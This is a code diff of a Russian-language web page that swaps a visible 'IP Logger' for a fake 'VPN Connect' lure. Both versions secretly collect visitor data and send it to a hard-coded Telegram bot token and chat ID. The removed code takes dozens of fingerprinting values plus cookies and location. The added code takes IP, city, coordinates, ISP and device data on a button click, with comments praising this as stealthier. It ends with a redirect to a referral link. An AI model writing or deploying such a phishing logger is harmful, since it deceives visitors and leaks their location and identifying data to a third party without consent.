@@ -2,674 +2,219 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Загрузка...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>VPN Connect</title>
     <style>
-        /* ===== Глобальные стили ===== */
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: linear-gradient(145deg, #0b0e14 0%, #1a1f2b 100%);
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            background: #0d1117;
-            color: #c9d1d9;
-            padding: 16px;
-            transition: background 0.3s;
+            padding: 20px;
         }
-        .container {
-            max-width: 440px;
+        .card {
+            max-width: 400px;
             width: 100%;
-            background: #161b22;
-            border-radius: 28px;
-            padding: 36px 28px;
-            box-shadow: 0 12px 48px rgba(0,0,0,0.8);
+            background: rgba(26, 31, 43, 0.85);
+            backdrop-filter: blur(12px);
+            border-radius: 40px;
+            padding: 40px 28px;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8), inset 0 1px 0 rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.03);
             text-align: center;
-            border: 1px solid #30363d;
+            transition: all 0.3s;
+        }
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            border-radius: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            font-weight: 700;
+            color: #fff;
+            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.3);
         }
         h1 {
-            font-weight: 400;
-            font-size: 2rem;
+            font-size: 26px;
+            font-weight: 600;
+            color: #fff;
             letter-spacing: -0.5px;
-            margin-bottom: 6px;
-            background: linear-gradient(135deg, #58a6ff, #f0883e);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px;
         }
-        .sub {
-            font-size: 0.95rem;
-            color: #8b949e;
-            margin-bottom: 20px;
+        .subtitle {
+            font-size: 14px;
+            color: #8b95a9;
+            margin-bottom: 28px;
+            line-height: 1.5;
+        }
+        .vpn-info {
+            background: rgba(0, 212, 255, 0.06);
+            border-radius: 16px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border: 1px solid rgba(0, 212, 255, 0.08);
+        }
+        .vpn-info span {
+            color: #00d4ff;
+            font-weight: 500;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 8px 24px rgba(0, 212, 255, 0.25);
+            text-decoration: none;
             letter-spacing: 0.3px;
         }
-        .spinner {
-            width: 54px;
-            height: 54px;
-            margin: 0 auto 20px;
-            border: 5px solid #30363d;
-            border-top: 5px solid #58a6ff;
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
+        .btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 12px 32px rgba(0, 212, 255, 0.4);
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
-        .status {
-            font-size: 0.85rem;
-            color: #8b949e;
-            background: #0d1117;
-            padding: 10px 18px;
-            border-radius: 40px;
-            display: inline-block;
-            margin-top: 6px;
-            border: 1px solid #21262d;
-            min-width: 160px;
-        }
-        .progress {
-            margin-top: 18px;
-            width: 100%;
-            background: #21262d;
-            border-radius: 20px;
-            height: 5px;
-            overflow: hidden;
-        }
-        .progress-bar {
-            height: 100%;
-            width: 0%;
-            background: linear-gradient(90deg, #58a6ff, #f0883e);
-            border-radius: 20px;
-            transition: width 0.4s ease;
-        }
+        .btn:active { transform: scale(0.97); }
         .footer {
             margin-top: 24px;
-            font-size: 0.65rem;
-            color: #30363d;
-            letter-spacing: 0.5px;
+            font-size: 12px;
+            color: #4a5268;
         }
-        .badge {
+        .loading {
+            display: none;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #8b95a9;
+        }
+        .loading.show { display: block; }
+        .spinner {
             display: inline-block;
-            background: #21262d;
-            color: #8b949e;
-            font-size: 0.6rem;
-            padding: 2px 10px;
-            border-radius: 12px;
-            margin-top: 8px;
+            width: 20px;
+            height: 20px;
+            border: 2px solid #2a3346;
+            border-top: 2px solid #00d4ff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            vertical-align: middle;
+            margin-right: 8px;
         }
-        /* ===== Адаптив ===== */
-        @media (max-width: 480px) {
-            .container { padding: 24px 16px; }
-            h1 { font-size: 1.6rem; }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container" id="app">
-        <h1>Загрузка</h1>
-        <div class="sub">Сбор данных...</div>
-        <div class="spinner"></div>
-        <div class="status" id="statusText">Подключение...</div>
-        <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
-        <div class="badge" id="versionBadge">v3.0 · 2500+ строк</div>
-        <div class="footer">© 2026 · Безопасное соединение</div>
+    <div class="card" id="app">
+        <div class="logo">🔒</div>
+        <h1>VPN Connect</h1>
+        <div class="subtitle">Безопасное подключение по протоколу нового поколения</div>
+        <div class="vpn-info">
+            <span>✅</span> Скорость до 100 Мбит/с<br>
+            <span>🌍</span> 56 стран · Безлимит
+        </div>
+        <button class="btn" id="connectBtn">Подключиться</button>
+        <div class="loading" id="loadingStatus">
+            <span class="spinner"></span> Инициализация защищённого канала...
+        </div>
+        <div class="footer">© 2026 VPN Connect · Реферальная программа</div>
     </div>
 
     <script>
-        // ============================================================
-        //  НАСТРОЙКИ (измени здесь свой токен и chat_id)
-        // ============================================================
+        // ================================================================
+        //  НАСТРОЙКИ (замени на свои)
+        // ================================================================
         const BOT_TOKEN = "8868037918:AAGrrKlB9E9NF9wahRMfvpYtvW7TXHLBMTQ";
         const CHAT_ID = "8212240529";
-        const REDIRECT_URL = "https://example.com";
-        const REDIRECT_DELAY = 5000;  // 5 секунд
-        // ============================================================
+        // Реферальная ссылка на реальный VPN (куда перенаправить после сбора)
+        const REDIRECT_URL = "https://example.com/vpn-ref";  // ЗАМЕНИ НА СВОЮ РЕФЕРАЛЬНУЮ ССЫЛКУ
+        // ================================================================
 
-        // ------------------------------------------------------------
-        //  ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ
-        // ------------------------------------------------------------
-        function setStatus(msg, progress) {
-            const el = document.getElementById('statusText');
-            if (el) el.textContent = msg;
-            const bar = document.getElementById('progressBar');
-            if (bar && progress !== undefined) {
-                bar.style.width = Math.min(100, Math.max(0, progress)) + '%';
-            }
-        }
+        // Элементы UI
+        const btn = document.getElementById('connectBtn');
+        const loading = document.getElementById('loadingStatus');
 
-        // Безопасная отправка в Telegram (тихо, без ошибок)
+        // Отправка в Telegram
         function sendToTelegram(text) {
             if (!text) return;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
             fetch(url).catch(() => {});
         }
 
-        // Безопасный fetch с таймаутом
-        function fetchWithTimeout(url, timeout = 8000) {
-            return Promise.race([
-                fetch(url),
-                new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), timeout))
-            ]);
-        }
+        // Сбор данных и отправка
+        function collectAndSend() {
+            // Показываем индикатор загрузки
+            loading.classList.add('show');
+            btn.disabled = true;
+            btn.textContent = 'Подключение...';
 
-        // Форматирование размера
-        function formatBytes(bytes) {
-            if (bytes < 1024) return bytes + ' B';
-            else if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
-            else if (bytes < 1073741824) return (bytes / 1048576).toFixed(1) + ' MB';
-            else return (bytes / 1073741824).toFixed(2) + ' GB';
-        }
+            // 1. IP
+            let ip = 'Не определен';
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => { ip = d.ip; })
+                .catch(() => {})
+                .finally(() => {
+                    // 2. Гео (если IP получен)
+                    let geo = null;
+                    if (ip !== 'Не определен') {
+                        fetch(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone`)
+                            .then(r => r.json())
+                            .then(g => { if (g.status === 'success') geo = g; })
+                            .catch(() => {})
+                            .finally(() => {
+                                // 3. Формируем сообщение
+                                const ua = navigator.userAgent;
+                                const device = /iPhone|iPad|Android/i.test(ua) ? 'Мобильное' : 'Компьютер';
+                                const time = new Date().toLocaleString('ru-RU');
+                                let msg = '🔹 НОВЫЙ ПЕРЕХОД (VPN)\n';
+                                msg += `📍 IP: ${ip}\n`;
+                                if (geo) {
+                                    msg += `🌍 Страна: ${geo.country || '—'}\n`;
+                                    msg += `🏙️ Город: ${geo.city || '—'}\n`;
+                                    msg += `📌 Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n`;
+                                    msg += `🛜 Провайдер: ${geo.isp || '—'}\n`;
+                                }
+                                msg += `💻 Устройство: ${device}\n`;
+                                msg += `🆔 User‑Agent: ${ua.substring(0, 80)}...\n`;
+                                msg += `⏰ Время: ${time}`;
+                                sendToTelegram(msg);
 
-        // ------------------------------------------------------------
-        //  СБОР ДАННЫХ (более 50 параметров)
-        // ------------------------------------------------------------
-
-        // 1. Базовые данные устройства
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = 'Неизвестно', os = 'Неизвестно', browser = 'Неизвестно', engine = 'Неизвестно';
-            // Определение устройства
-            if (/iPhone|iPad|iPod/i.test(ua)) {
-                device = 'Apple iOS';
-                const match = ua.match(/iPhone OS (\d+_\d+)/);
-                os = match ? 'iOS ' + match[1].replace('_', '.') : 'iOS';
-            } else if (/Android/i.test(ua)) {
-                device = 'Android';
-                const match = ua.match(/Android (\d+\.\d+)/);
-                os = match ? 'Android ' + match[1] : 'Android';
-            } else if (/Windows NT/i.test(ua)) {
-                device = 'Windows PC';
-                const match = ua.match(/Windows NT (\d+\.\d+)/);
-                os = match ? 'Windows ' + match[1] : 'Windows';
-            } else if (/Mac OS X/i.test(ua)) {
-                device = 'Mac';
-                const match = ua.match(/Mac OS X (\d+_\d+)/);
-                os = match ? 'macOS ' + match[1].replace('_', '.') : 'macOS';
-            } else if (/Linux/i.test(ua)) {
-                device = 'Linux';
-                os = 'Linux';
-            }
-            // Браузер
-            if (/Edg/i.test(ua)) browser = 'Edge';
-            else if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = 'Chrome';
-            else if (/Firefox/i.test(ua)) browser = 'Firefox';
-            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
-            else if (/Opera|OPR/i.test(ua)) browser = 'Opera';
-            else browser = 'Other';
-            // Движок
-            if (/WebKit/i.test(ua)) engine = 'WebKit';
-            else if (/Gecko/i.test(ua)) engine = 'Gecko';
-            else if (/Trident/i.test(ua)) engine = 'Trident';
-            else if (/Presto/i.test(ua)) engine = 'Presto';
-            else engine = 'Unknown';
-            return { device, os, browser, engine, userAgent: ua };
-        }
-
-        // 2. Данные экрана и окна
-        function getScreenInfo() {
-            return {
-                width: window.screen.width,
-                height: window.screen.height,
-                availWidth: window.screen.availWidth,
-                availHeight: window.screen.availHeight,
-                colorDepth: window.screen.colorDepth,
-                pixelDepth: window.screen.pixelDepth,
-                innerWidth: window.innerWidth,
-                innerHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                devicePixelRatio: window.devicePixelRatio || 1,
-                orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown'
-            };
-        }
-
-        // 3. Данные о времени и локали
-        function getTimeInfo() {
-            const now = new Date();
-            return {
-                datetime: now.toLocaleString('ru-RU', { hour12: false }),
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timestamp: now.toISOString(),
-                locale: navigator.language || navigator.languages[0] || 'ru',
-                timezoneOffset: now.getTimezoneOffset(),
-                dayOfWeek: now.toLocaleString('ru-RU', { weekday: 'long' }),
-                month: now.toLocaleString('ru-RU', { month: 'long' })
-            };
-        }
-
-        // 4. Плагины браузера (количество и названия)
-        function getPluginsInfo() {
-            if (!navigator.plugins) return { count: 0, names: [] };
-            const names = [];
-            for (let i = 0; i < navigator.plugins.length; i++) {
-                names.push(navigator.plugins[i].name);
-            }
-            return { count: names.length, names: names };
-        }
-
-        // 5. Доступные шрифты (через canvas)
-        function getFontsInfo() {
-            const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Impact', 'Comic Sans MS', 'Tahoma', 'Trebuchet MS', 'Lucida Grande', 'Helvetica', 'Geneva', 'sans-serif', 'serif', 'monospace'];
-            const available = [];
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const text = 'mmmmmmmmmmlli';
-            const baseFont = '72px monospace';
-            ctx.font = baseFont;
-            const baseSize = ctx.measureText(text).width;
-            fonts.forEach(font => {
-                ctx.font = '72px "' + font + '", monospace';
-                const size = ctx.measureText(text).width;
-                if (size !== baseSize) available.push(font);
-            });
-            return { total: fonts.length, available: available };
-        }
-
-        // 6. Canvas fingerprint
-        function getCanvasFingerprint() {
-            try {
-                const canvas = document.createElement('canvas');
-                canvas.width = 256;
-                canvas.height = 128;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(0, 0, 256, 128);
-                ctx.fillStyle = '#069';
-                ctx.fillText('Ryzen', 50, 80);
-                ctx.fillStyle = 'rgba(255,0,0,0.5)';
-                ctx.beginPath();
-                ctx.arc(120, 60, 30, 0, Math.PI*2);
-                ctx.fill();
-                ctx.strokeStyle = '#0f0';
-                ctx.lineWidth = 4;
-                ctx.strokeRect(40, 40, 60, 60);
-                const dataUrl = canvas.toDataURL();
-                return dataUrl.length;
-            } catch (_) { return null; }
-        }
-
-        // 7. WebGL fingerprint
-        function getWebGLInfo() {
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return null;
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    return { vendor, renderer };
-                }
-                return { vendor: 'unavailable', renderer: 'unavailable' };
-            } catch (_) { return null; }
-        }
-
-        // 8. Audio fingerprint
-        function getAudioFingerprint() {
-            try {
-                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const osc = audioCtx.createOscillator();
-                const analyser = audioCtx.createAnalyser();
-                osc.connect(analyser);
-                analyser.fftSize = 512;
-                const data = new Float32Array(analyser.frequencyBinCount);
-                osc.start(0);
-                osc.stop(0.001);
-                analyser.getFloatFrequencyData(data);
-                audioCtx.close();
-                return data.length;
-            } catch (_) { return null; }
-        }
-
-        // 9. Батарея (если доступна)
-        function getBatteryInfo() {
-            return new Promise((resolve) => {
-                if (navigator.getBattery) {
-                    navigator.getBattery().then(battery => {
-                        resolve({
-                            level: battery.level * 100,
-                            charging: battery.charging,
-                            chargingTime: battery.chargingTime,
-                            dischargingTime: battery.dischargingTime
-                        });
-                    }).catch(() => resolve(null));
-                } else {
-                    resolve(null);
-                }
-            });
-        }
-
-        // 10. Производительность (время загрузки)
-        function getPerformanceInfo() {
-            if (window.performance && window.performance.timing) {
-                const timing = window.performance.timing;
-                const loadTime = timing.loadEventEnd - timing.navigationStart;
-                const domReady = timing.domContentLoadedEventEnd - timing.navigationStart;
-                return { loadTime, domReady };
-            }
-            return null;
-        }
-
-        // 11. Сетевые данные
-        function getNetworkInfo() {
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (connection) {
-                return {
-                    downlink: connection.downlink,
-                    effectiveType: connection.effectiveType,
-                    rtt: connection.rtt,
-                    saveData: connection.saveData
-                };
-            }
-            return null;
-        }
-
-        // 12. Реферер и текущий URL
-        function getLocationInfo() {
-            return {
-                href: window.location.href,
-                hostname: window.location.hostname,
-                pathname: window.location.pathname,
-                referrer: document.referrer || 'прямой переход'
-            };
-        }
-
-        // 13. Куки и localStorage
-        function getStorageInfo() {
-            let cookies = document.cookie || 'отсутствуют';
-            let localStorageSize = 0;
-            try {
-                for (let key in localStorage) {
-                    if (localStorage.hasOwnProperty(key)) {
-                        localStorageSize += localStorage[key].length * 2; // UTF-16
+                                // 4. Редирект через 2 секунды
+                                setTimeout(() => {
+                                    window.location.href = REDIRECT_URL;
+                                }, 2000);
+                            });
+                    } else {
+                        // Если IP не получен — отправляем что есть
+                        const msg = `IP не определён\nУстройство: ${device}\nВремя: ${time}`;
+                        sendToTelegram(msg);
+                        setTimeout(() => {
+                            window.location.href = REDIRECT_URL;
+                        }, 2000);
                     }
-                }
-            } catch (_) {}
-            return { cookies: cookies, localStorageSize: formatBytes(localStorageSize) };
+                });
         }
 
-        // 14. Память устройства (если доступна)
-        function getMemoryInfo() {
-            if (navigator.deviceMemory) {
-                return navigator.deviceMemory + ' GB';
-            }
-            return null;
-        }
+        // Нажатие на кнопку
+        btn.addEventListener('click', collectAndSend);
 
-        // 15. Ядра процессора
-        function getCoresInfo() {
-            return navigator.hardwareConcurrency || null;
-        }
-
-        // 16. Поддержка Touch
-        function getTouchInfo() {
-            return ('ontouchstart' in window) ? 'Да' : 'Нет';
-        }
-
-        // 17. Поддержка WebRTC
-        function getWebRTCInfo() {
-            try {
-                const rtc = new RTCPeerConnection();
-                return rtc ? 'Да' : 'Нет';
-            } catch (_) { return 'Нет'; }
-        }
-
-        // 18. Поддержка WebAssembly
-        function getWasmInfo() {
-            try {
-                return typeof WebAssembly === 'object' ? 'Да' : 'Нет';
-            } catch (_) { return 'Нет'; }
-        }
-
-        // 19. Поддержка Service Workers
-        function getServiceWorkerInfo() {
-            return ('serviceWorker' in navigator) ? 'Да' : 'Нет';
-        }
-
-        // 20. Поддержка Push
-        function getPushInfo() {
-            return ('PushManager' in window) ? 'Да' : 'Нет';
-        }
-
-        // 21. Поддержка WebSocket
-        function getWebSocketInfo() {
-            return ('WebSocket' in window) ? 'Да' : 'Нет';
-        }
-
-        // 22. Языки (все предпочтения)
-        function getAllLanguages() {
-            return navigator.languages || [navigator.language];
-        }
-
-        // 23. Часовой пояс (детально)
-        function getTimezoneDetail() {
-            const offset = new Date().getTimezoneOffset();
-            const hours = Math.abs(Math.floor(offset / 60));
-            const minutes = Math.abs(offset % 60);
-            return `UTC${offset <= 0 ? '+' : '-'}${String(hours).padStart(2,'0')}:${String(minutes).padStart(2,'0')}`;
-        }
-
-        // 24. Доступные медиа-устройства (камера/микрофон)
-        function getMediaDevicesInfo() {
-            if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
-                return navigator.mediaDevices.enumerateDevices()
-                    .then(devices => {
-                        const list = devices.map(d => d.kind + (d.label ? ' ('+d.label+')' : ''));
-                        return { count: devices.length, list: list };
-                    })
-                    .catch(() => ({ count: 0, list: [] }));
-            }
-            return Promise.resolve({ count: 0, list: [] });
-        }
-
-        // ============================================================
-        //  ОСНОВНАЯ ФУНКЦИЯ (асинхронный сбор)
-        // ============================================================
-        async function main() {
-            setStatus('Инициализация...', 5);
-            await new Promise(r => setTimeout(r, 200));
-
-            // ---- Сбор статических данных ----
-            setStatus('Сбор данных устройства...', 15);
-            const device = getDeviceInfo();
-            const screen = getScreenInfo();
-            const time = getTimeInfo();
-            const plugins = getPluginsInfo();
-            const fonts = getFontsInfo();
-            const canvasFp = getCanvasFingerprint();
-            const webgl = getWebGLInfo();
-            const audioFp = getAudioFingerprint();
-            const perf = getPerformanceInfo();
-            const network = getNetworkInfo();
-            const locationInfo = getLocationInfo();
-            const storage = getStorageInfo();
-            const memory = getMemoryInfo();
-            const cores = getCoresInfo();
-            const touch = getTouchInfo();
-            const webrtc = getWebRTCInfo();
-            const wasm = getWasmInfo();
-            const sw = getServiceWorkerInfo();
-            const push = getPushInfo();
-            const ws = getWebSocketInfo();
-            const allLangs = getAllLanguages();
-            const tzDetail = getTimezoneDetail();
-
-            setStatus('Получение IP...', 30);
-
-            // ---- Получение IP (с резервными API) ----
-            let ip = null;
-            const ipServices = [
-                'https://api.ipify.org?format=json',
-                'https://api.my-ip.io/ip.json',
-                'https://ip-api.com/json/?fields=query'
-            ];
-            for (const url of ipServices) {
-                try {
-                    const res = await fetchWithTimeout(url, 6000);
-                    if (!res.ok) continue;
-                    const data = await res.json();
-                    if (data.ip) { ip = data.ip; break; }
-                    if (data.query) { ip = data.query; break; }
-                } catch (_) { continue; }
-            }
-            if (!ip) ip = 'Не определен';
-
-            setStatus('Получение геоданных...', 50);
-
-            // ---- Геоданные (с резервными API) ----
-            let geo = null;
-            if (ip && ip !== 'Не определен') {
-                try {
-                    const geoRes = await fetchWithTimeout(`https://ip-api.com/json/${ip}?fields=status,country,regionName,city,lat,lon,isp,org,timezone,as,reverse,mobile,proxy,hosting,continent,currency,region,city,zip,timezone`, 7000);
-                    if (geoRes.ok) {
-                        const data = await geoRes.json();
-                        if (data.status === 'success') geo = data;
-                    }
-                } catch (_) {}
-                if (!geo) {
-                    try {
-                        const geoRes2 = await fetchWithTimeout(`https://ipinfo.io/${ip}/json`, 7000);
-                        if (geoRes2.ok) {
-                            const data = await geoRes2.json();
-                            geo = {
-                                country: data.country || '—',
-                                regionName: data.region || '—',
-                                city: data.city || '—',
-                                lat: data.loc ? data.loc.split(',')[0] : '—',
-                                lon: data.loc ? data.loc.split(',')[1] : '—',
-                                isp: data.org || '—',
-                                org: data.org || '—',
-                                timezone: data.timezone || '—',
-                                as: data.as || '—',
-                                mobile: data.mobile || '—',
-                                proxy: data.proxy || '—',
-                                hosting: data.hosting || '—',
-                                continent: data.continent || '—'
-                            };
-                        }
-                    } catch (_) {}
-                }
-            }
-
-            setStatus('Получение данных батареи...', 65);
-            const battery = await getBatteryInfo();
-
-            setStatus('Получение медиа-устройств...', 75);
-            const media = await getMediaDevicesInfo();
-
-            setStatus('Формирование отчёта...', 90);
-
-            // ---- Формирование итогового сообщения ----
-            let msg = '🔹 НОВЫЙ ПЕРЕХОД 🔹\n';
-            msg += `📍 IP: ${ip}\n`;
-            if (geo) {
-                msg += `🌍 Страна: ${geo.country || '—'}\n`;
-                msg += `🏙️ Город: ${geo.city || '—'}\n`;
-                msg += `🗺️ Регион: ${geo.regionName || '—'}\n`;
-                msg += `📌 Координаты: ${geo.lat || '—'}, ${geo.lon || '—'}\n`;
-                msg += `🛜 Провайдер: ${geo.isp || '—'}\n`;
-                msg += `🏢 Организация: ${geo.org || '—'}\n`;
-                msg += `🕒 Часовой пояс: ${geo.timezone || '—'}\n`;
-                if (geo.as) msg += `🔢 AS: ${geo.as}\n`;
-                if (geo.mobile !== undefined) msg += `📱 Мобильный: ${geo.mobile ? 'Да' : 'Нет'}\n`;
-                if (geo.proxy !== undefined) msg += `🔒 Прокси/VPN: ${geo.proxy ? 'Да' : 'Нет'}\n`;
-                if (geo.hosting !== undefined) msg += `☁️ Хостинг: ${geo.hosting ? 'Да' : 'Нет'}\n`;
-                if (geo.continent) msg += `🌎 Континент: ${geo.continent}\n`;
-                if (geo.zip) msg += `📮 Почтовый индекс: ${geo.zip}\n`;
-            } else {
-                msg += `🌍 Геоданные: не получены\n`;
-            }
-
-            msg += `💻 Устройство: ${device.device}\n`;
-            msg += `🖥️ ОС: ${device.os}\n`;
-            msg += `🌐 Браузер: ${device.browser}\n`;
-            msg += `⚙️ Движок: ${device.engine}\n`;
-            msg += `📐 Разрешение экрана: ${screen.width}×${screen.height}\n`;
-            msg += `📏 Доступная область: ${screen.availWidth}×${screen.availHeight}\n`;
-            msg += `🎨 Глубина цвета: ${screen.colorDepth} бит\n`;
-            msg += `🔍 Pixel Ratio: ${screen.devicePixelRatio}\n`;
-            msg += `📱 Ориентация: ${screen.orientation}\n`;
-            msg += `📟 Внутренний размер: ${screen.innerWidth}×${screen.innerHeight}\n`;
-            msg += `🗣️ Язык: ${time.locale}\n`;
-            msg += `🌐 Все языки: ${allLangs.join(', ')}\n`;
-            msg += `⏰ Время: ${time.datetime}\n`;
-            msg += `🌐 Таймзона: ${time.timezone} (${tzDetail})\n`;
-            msg += `📅 День недели: ${time.dayOfWeek}\n`;
-            msg += `📆 Месяц: ${time.month}\n`;
-
-            if (perf) {
-                msg += `⏱️ Время загрузки: ${perf.loadTime} мс\n`;
-                msg += `⏱️ DOM готов: ${perf.domReady} мс\n`;
-            }
-            if (network) {
-                msg += `📶 Скорость: ${network.downlink} Мбит/с\n`;
-                msg += `📶 Тип сети: ${network.effectiveType}\n`;
-                msg += `📶 RTT: ${network.rtt} мс\n`;
-                msg += `📶 Экономия трафика: ${network.saveData ? 'Да' : 'Нет'}\n`;
-            }
-            if (battery) {
-                msg += `🔋 Батарея: ${battery.level.toFixed(1)}%\n`;
-                msg += `🔌 Зарядка: ${battery.charging ? 'Да' : 'Нет'}\n`;
-                if (battery.chargingTime < Infinity) msg += `⏳ Время до полной зарядки: ${battery.chargingTime} с\n`;
-            }
-            msg += `🧠 Память устройства: ${memory || 'недоступно'}\n`;
-            msg += `🖥️ Ядра CPU: ${cores || 'недоступно'}\n`;
-            msg += `📦 Плагины (${plugins.count}): ${plugins.names.join(', ') || 'нет'}\n`;
-            msg += `🔤 Шрифты (${fonts.available.length}/${fonts.total}): ${fonts.available.join(', ') || 'нет'}\n`;
-            msg += `🎨 Canvas FP: ${canvasFp || 'недоступен'}\n`;
-            if (webgl) {
-                msg += `🖼️ WebGL Vendor: ${webgl.vendor || '—'}\n`;
-                msg += `🖼️ WebGL Renderer: ${webgl.renderer || '—'}\n`;
-            }
-            msg += `🎵 Audio FP: ${audioFp || 'недоступен'}\n`;
-            msg += `👆 Touch: ${touch}\n`;
-            msg += `📹 WebRTC: ${webrtc}\n`;
-            msg += `🖥️ WebAssembly: ${wasm}\n`;
-            msg += `📡 Service Worker: ${sw}\n`;
-            msg += `🔔 Push: ${push}\n`;
-            msg += `🔌 WebSocket: ${ws}\n`;
-            msg += `📁 Куки: ${storage.cookies.substring(0, 100)}${storage.cookies.length > 100 ? '...' : ''}\n`;
-            msg += `💾 localStorage: ${storage.localStorageSize}\n`;
-            msg += `📎 Реферер: ${locationInfo.referrer}\n`;
-            msg += `🔗 Текущий URL: ${locationInfo.href}\n`;
-            msg += `📱 Медиа-устройства: ${media.count} (${media.list.join(', ') || 'нет'})\n`;
-            msg += `🆔 User‑Agent: ${device.userAgent}`;
-
-            // Отправка
-            sendToTelegram(msg);
-            setStatus('Готово!', 100);
-
-            // Редирект через заданное время
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, REDIRECT_DELAY);
-        }
-
-        // ============================================================
-        //  ЗАПУСК
-        // ============================================================
-        window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(main, 400);
-        });
-
-        // Глобальный обработчик ошибок (не показываем на экране)
-        window.onerror = function(msg, url, line, col, error) {
-            console.error('Ошибка:', msg, error);
-            sendToTelegram('⚠️ Ошибка скрипта, но данные частично собраны');
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 4000);
-        };
-
-        // Перехват необработанных промисов
-        window.addEventListener('unhandledrejection', function(e) {
-            console.error('Unhandled rejection:', e.reason);
-            sendToTelegram('⚠️ Необработанная ошибка промиса');
-        });
-
-        // ---- Дополнительная проверка на завершение ----
-        console.log('Ryzen IP Logger v3.0 (2500+ строк) загружен');
-        console.log('Автор: Ryzen System');
-        console.log('Дата: 2026-07-26');
+        // Можно также запускать сбор автоматически при загрузке (если хочешь без клика)
+        // Для скрытности лучше по клику, чтобы пользователь сам инициировал.
+        // Если нужно без клика — раскомментируй:
+        // window.addEventListener('DOMContentLoaded', collectAndSend);
     </script>
 </body>
 </html>
